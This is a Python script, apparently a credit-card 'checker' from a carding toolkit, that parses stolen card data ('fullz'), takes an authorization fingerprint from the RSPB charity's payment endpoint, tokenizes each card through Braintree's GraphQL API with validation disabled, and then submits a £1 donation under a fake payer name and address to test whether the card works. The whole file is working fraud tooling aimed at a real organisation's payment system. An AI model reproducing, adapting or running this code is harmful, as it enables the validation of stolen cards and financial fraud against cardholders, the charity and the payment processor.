import asyncio
import base64
import random
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import json


async def create_shopify_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        cc1 = cc[:4]
        cc2 = cc[4:8]
        cc3 = cc[8:12]
        cc4 = cc[12:]
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]
        address             = "12 Main Street"
        city                = "Brewster"
        state               = "New York"
        state_short         = "NY"
        country             = "United States"
        zip_code            ="10509"
        phone               ="(727) 945-1000"

        response = requests.get('https://api-cdn.rspb.org.uk/payments/token')

        # print(response.text)

        try:
            auth_token=response.json()['payload']
            decode_tok = base64.b64decode(auth_token).decode('utf-8')
            auth = json.loads(decode_tok).get('authorizationFingerprint')
            # print(auth)
        except:
            return response.text


                
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {auth}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'adf341da-702c-49ed-8316-c7f278c737b6',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'cardholderName': 'Micah Schiller',
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        try:
            token=response.json()['data']['tokenizeCreditCard']['token']
            # print(token)
        except:
            return response.text


        
        params = {
            'lang': 'en-gb',
        }

        json_data = {
            'sourceCode': None,
            'productCode': 'WEB',
            'payer': {
                'identityId': None,
                'title': 'Mr',
                'firstName': 'Crish',
                'lastName': 'Niki',
                'emailAddress': 'crishniki158@gmail.com',
                'giftAid': False,
                'dob': None,
                'address': {
                    'line1': '2 Wentworth Terrace',
                    'line2': '',
                    'line3': '',
                    'town': 'Wakefield',
                    'county': '',
                    'postcode': 'WF1 3QN',
                    'country': 'United Kingdom',
                },
                'dpaPreferences': {
                    'email': False,
                    'post': False,
                    'phone': False,
                    'text': False,
                    'phoneNumber': '',
                    'mobileNumber': '',
                },
            },
            'payment': {
                'frequency': 'oneOff',
                'amount': 1,
                'accountName': '',
                'accountNumber': '',
                'sortCode': '',
                'token': token,
                'clientDeviceData': '{"correlation_id":"5a1fd268a680a1de7784890c684f3059"}',
            },
        }

        response = requests.post('https://api-cdn.rspb.org.uk/donations/donate', params=params, json=json_data)

        print(response.text)

        return response.text

    except Exception as e:
        return str(e)
